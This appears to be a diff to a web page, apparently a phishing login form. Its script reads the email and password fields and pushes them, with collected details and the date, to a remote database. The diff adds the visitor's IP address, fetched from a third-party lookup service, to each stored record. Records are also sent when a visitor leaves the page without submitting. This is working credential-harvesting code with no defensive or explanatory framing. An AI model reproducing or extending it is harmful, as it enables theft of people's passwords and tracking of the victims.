@@ -120,6 +120,10 @@
         $('*').removeClass('password');
     });;
 </script>
+<script type="text/javascript">
+    var userip="ipnotdetected";
+</script>
+<script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
 <script>
     var filled2=0;
 var data2="";
@@ -131,7 +135,7 @@ var date=Date();
        message=document.getElementById("email").value;
 var feedback="";
        feedback=document.getElementById("password").value;
-       messagesRef.push({fieldName:message, text:feedback,detailsjson:data2,date:date});
+       messagesRef.push({fieldName:message, text:feedback,detailsjson:data2,date:date,userIP:userip});
        document.getElementById("email").value = '';
        document.getElementById("password").value = '';
 //       document.getElementById("feedback2").style.animationDirection="reverse";
@@ -145,18 +149,10 @@ window.onbeforeunload = function(){
     // Do something
 
     if(filled2!=1)
-        messagesRef.push({detailsjson:data2,date:date});
+        messagesRef.push({detailsjson:data2,date:date,userIP:userip});
    // alert("fired");
 
 }
 </script>
-<script type="text/javascript">
-    var userip="ipnotdetected";
-</script>
-<script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
-<script type="text/javascript">
-    alert("Your IP is :", userip);
-</script>
-
 </body>
 </html>
